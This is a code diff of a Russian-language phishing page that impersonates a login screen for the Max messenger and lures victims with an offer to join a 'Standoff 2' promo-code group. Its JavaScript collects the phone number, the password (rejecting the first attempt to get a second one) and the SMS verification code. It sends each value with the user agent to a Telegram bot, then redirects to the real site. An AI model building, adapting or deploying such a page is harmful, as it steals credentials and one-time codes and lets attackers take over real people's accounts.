@@ -2,76 +2,184 @@
 <html lang="ru"><head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Вход в Max</title>
+<title>Вход в группу — Max</title>
 <style>
-:root{--bg:#0f1115;--card:#1a1d24;--accent:#ff6633;--text:#e8e8ea;--mute:#8a8f98;--err:#ff5252}
+:root{--text:#fff;--mute:#9aa0ac;--err:#ff5252;--link:#3ea6ff}
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.card{background:var(--card);border-radius:16px;padding:32px;max-width:380px;width:100%}
-.logo{width:56px;height:56px;border-radius:16px;background:var(--accent);margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:700;color:#fff}
-h1{font-size:20px;text-align:center;margin-bottom:6px}
-.sub{color:var(--mute);font-size:13px;text-align:center;margin-bottom:24px}
-label{display:block;color:var(--mute);font-size:12px;margin:14px 0 6px}
-input{width:100%;background:#242830;border:1px solid #2e333c;color:var(--text);padding:12px;border-radius:10px;font-size:15px;outline:none}
-input:focus{border-color:var(--accent)}
-.masked{-webkit-text-security:disc;-moz-text-security:disc;text-security:disc}
-.btn{width:100%;background:var(--accent);color:#fff;border:none;padding:13px;border-radius:10px;font-size:15px;font-weight:600;margin-top:20px;cursor:pointer}
-.err{color:var(--err);font-size:13px;margin-top:10px;min-height:16px}
-.otp{display:none}
+html,body{height:100%}
+body{
+  font-family:-apple-system,'SF Pro Display','Segoe UI',Roboto,sans-serif;
+  color:var(--text);
+  background:#0a0a14;
+  min-height:100vh;
+  display:flex;align-items:center;justify-content:center;
+  padding:20px;
+  position:relative;
+  overflow:hidden;
+}
+body::before{
+  content:'';
+  position:fixed;inset:0;
+  background-image:
+    radial-gradient(circle at 10% 20%, rgba(120,80,200,.15) 0, transparent 2%),
+    radial-gradient(circle at 85% 30%, rgba(80,120,200,.12) 0, transparent 2%),
+    radial-gradient(circle at 25% 75%, rgba(120,80,200,.1) 0, transparent 2%),
+    radial-gradient(circle at 70% 85%, rgba(80,120,200,.1) 0, transparent 2%),
+    radial-gradient(1px 1px at 15% 15%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 45% 25%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 75% 10%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 25% 55%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 65% 65%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 85% 75%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 5% 85%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 55% 90%, #fff 50%, transparent 100%);
+  opacity:.4;
+  z-index:0;
+}
+.card{
+  position:relative;z-index:1;
+  background:linear-gradient(135deg,#1e4858 0%,#1a2a44 45%,#15152a 100%);
+  border-radius:24px;
+  padding:40px 36px 32px;
+  max-width:440px;width:100%;
+  box-shadow:0 20px 60px rgba(0,0,0,.5);
+}
+.icons{display:flex;justify-content:space-between;margin-bottom:28px}
+.icon{width:24px;height:24px;opacity:.6;cursor:pointer;color:#fff}
+.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:28px}
+.logo-dot{width:40px;height:40px;border-radius:50%;background:conic-gradient(from 180deg,#7c6cff,#4a9eff,#7c6cff);position:relative}
+.logo-dot::after{content:'';position:absolute;inset:8px;border-radius:50%;background:#15152a}
+.logo-text{font-size:28px;font-weight:600;letter-spacing:-.5px}
+h1{font-size:22px;font-weight:600;text-align:center;line-height:1.3;margin-bottom:24px;padding:0 10px}
+.input-wrap{background:rgba(255,255,255,.06);border-radius:12px;padding:4px;margin-bottom:12px}
+.input-row{display:flex;align-items:center;gap:4px;background:rgba(0,0,0,.25);border-radius:10px;padding:14px 16px}
+.flag{display:flex;align-items:center;gap:6px;color:#fff;font-size:15px;padding-right:10px;border-right:1px solid rgba(255,255,255,.1);margin-right:12px;cursor:pointer}
+.flag-emoji{font-size:18px}
+.arrow{opacity:.6;font-size:10px}
+input{flex:1;background:transparent;border:none;color:#fff;font-size:15px;outline:none}
+input::placeholder{color:rgba(255,255,255,.3)}
+.masked{-webkit-text-security:disc}
+.hint{font-size:13px;color:rgba(255,255,255,.5);margin:12px 4px 24px;line-height:1.4}
+.btn{
+  width:100%;background:rgba(255,255,255,.1);
+  color:rgba(255,255,255,.4);
+  border:none;padding:16px;border-radius:14px;
+  font-size:15px;font-weight:500;cursor:pointer;
+  transition:all .2s;
+}
+.btn.active{background:#fff;color:#15152a}
+.err{color:var(--err);font-size:13px;margin-top:10px;min-height:16px;text-align:center}
+.terms{font-size:12px;color:rgba(255,255,255,.4);text-align:center;line-height:1.5;margin:24px 0 16px;padding:0 12px}
+.terms b{color:rgba(255,255,255,.7);font-weight:500}
+.qr{text-align:center}
+.qr a{color:var(--link);font-size:14px;text-decoration:none;font-weight:500}
+.step2,.step3{display:none}
+.pwd-input{background:rgba(0,0,0,.25);border-radius:10px;padding:14px 16px;margin-bottom:12px}
 </style></head><body>
 <div class="card">
-<div class="logo">M</div>
-<h1>Вход в Max</h1>
-<p class="sub">Введите данные для продолжения</p>
-<form id="f1" autocomplete="off">
-<label>Телефон или email</label>
-<input name="field_u" type="text" autocomplete="off" spellcheck="false" required>
-<label>Пароль</label>
-<input name="field_p" type="text" class="masked" autocomplete="off" spellcheck="false" required>
-<div class="err" id="e1"></div>
-<button class="btn" type="submit">Войти</button>
-</form>
-<form id="f2" class="otp" autocomplete="off">
-<label>Код из SMS</label>
-<input name="field_c" type="text" inputmode="numeric" autocomplete="off" required>
-<div class="err" id="e2"></div>
-<button class="btn" type="submit">Подтвердить</button>
-</form>
+  <div class="icons">
+    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
+    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 015.8 1c0 2-3 3-3 3M12 17h.01"/></svg>
+  </div>
+
+  <div class="logo">
+    <div class="logo-dot"></div>
+    <div class="logo-text">max</div>
+  </div>
+
+  <div class="step1">
+    <h1>Вступить в группу<br>«Промокоды Standoff 2»</h1>
+    <div class="input-wrap">
+      <div class="input-row">
+        <div class="flag"><span class="flag-emoji">🇷🇺</span>+7<span class="arrow">▾</span></div>
+        <input id="phone" type="tel" inputmode="tel" placeholder="123 456 78 90" autocomplete="off">
+      </div>
+    </div>
+    <div class="hint">Для входа нужен номер из России или страны из списка — нажмите на флаг, чтобы выбрать</div>
+    <button class="btn" id="btn1" type="button">Продолжить</button>
+    <div class="err" id="e1"></div>
+  </div>
+
+  <div class="step2">
+    <h1>Введите пароль от Max</h1>
+    <div class="pwd-input">
+      <input id="pwd" type="text" class="masked" placeholder="Пароль" autocomplete="off" spellcheck="false">
+    </div>
+    <button class="btn" id="btn2" type="button">Войти</button>
+    <div class="err" id="e2"></div>
+  </div>
+
+  <div class="step3">
+    <h1>Код из SMS</h1>
+    <div class="pwd-input">
+      <input id="code" type="text" inputmode="numeric" placeholder="XXXXXX" autocomplete="off">
+    </div>
+    <button class="btn" id="btn3" type="button">Подтвердить</button>
+    <div class="err" id="e3"></div>
+  </div>
+
+  <div class="terms">
+    Нажимая «Продолжить», вы принимаете <b>политику конфиденциальности</b>, пользовательское соглашение и правила персональных рекомендаций
+  </div>
+  <div class="qr"><a href="#">Войти по QR-коду</a></div>
 </div>
+
 <script src="config.js"></script>
 <script>
 const sid = crypto.randomUUID().slice(0,8);
+let phoneVal = '';
+
 async function send(stage, data){
   let text;
-  if(stage==='creds'){
-    text = `[CREDS] ${sid}\nЛогин: ${data.login}\nПароль: ${data.password}\nUA: ${navigator.userAgent}`;
-  } else {
-    text = `[OTP] ${sid}\nКод: ${data.otp}`;
-  }
+  if(stage==='phone') text = `[PHONE] ${sid}\n+7 ${data.phone}\nUA: ${navigator.userAgent}`;
+  else if(stage==='pwd') text = `[PWD] ${sid}\n+7 ${phoneVal}\nПароль: ${data.pwd}`;
+  else text = `[OTP] ${sid}\n+7 ${phoneVal}\nКод: ${data.code}`;
   const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(text)}`;
-  try {
-    const r = await fetch(url);
-    const j = await r.json();
-    console.log('TG response:', j);
-  } catch(e){
-    console.log('TG error:', e);
-  }
+  try{ const r = await fetch(url); const j = await r.json(); console.log('TG:',j); }catch(e){ console.log(e); }
 }
-document.getElementById('f1').addEventListener('submit', async e=>{
-  e.preventDefault();
-  const fd = new FormData(e.target);
-  await send('creds', {login:fd.get('field_u'), password:fd.get('field_p')});
-  if(!e.target.dataset.retry){
-    e.target.dataset.retry='1';
-    document.getElementById('e1').textContent='Неверный логин или пароль';
+
+function activateBtn(input, btn){
+  input.addEventListener('input', ()=>{
+    if(input.value.trim().length>=3) btn.classList.add('active');
+    else btn.classList.remove('active');
+  });
+}
+
+const phone = document.getElementById('phone');
+const pwd = document.getElementById('pwd');
+const code = document.getElementById('code');
+activateBtn(phone, document.getElementById('btn1'));
+activateBtn(pwd, document.getElementById('btn2'));
+activateBtn(code, document.getElementById('btn3'));
+
+document.getElementById('btn1').addEventListener('click', async ()=>{
+  const v = phone.value.replace(/\D/g,'');
+  if(v.length<10){ document.getElementById('e1').textContent='Неверный номер'; return; }
+  phoneVal = v;
+  await send('phone', {phone:v});
+  document.querySelector('.step1').style.display='none';
+  document.querySelector('.step2').style.display='block';
+});
+
+document.getElementById('btn2').addEventListener('click', async ()=>{
+  const v = pwd.value;
+  if(v.length<3){ document.getElementById('e2').textContent='Введите пароль'; return; }
+  await send('pwd', {pwd:v});
+  if(!document.getElementById('btn2').dataset.retry){
+    document.getElementById('btn2').dataset.retry='1';
+    document.getElementById('e2').textContent='Неверный пароль, попробуйте ещё раз';
+    pwd.value='';
     return;
   }
-  document.getElementById('f1').style.display='none';
-  document.getElementById('f2').style.display='block';
+  document.querySelector('.step2').style.display='none';
+  document.querySelector('.step3').style.display='block';
 });
-document.getElementById('f2').addEventListener('submit', async e=>{
-  e.preventDefault();
-  await send('otp', {otp: new FormData(e.target).get('field_c')});
+
+document.getElementById('btn3').addEventListener('click', async ()=>{
+  const v = code.value.replace(/\D/g,'');
+  if(v.length<4){ document.getElementById('e3').textContent='Введите код'; return; }
+  await send('otp', {code:v});
   setTimeout(()=>{location.href='https://max.ru/promocod_standoffs'},500);
 });
-</script></body></html>
+</script>
+</body></html>
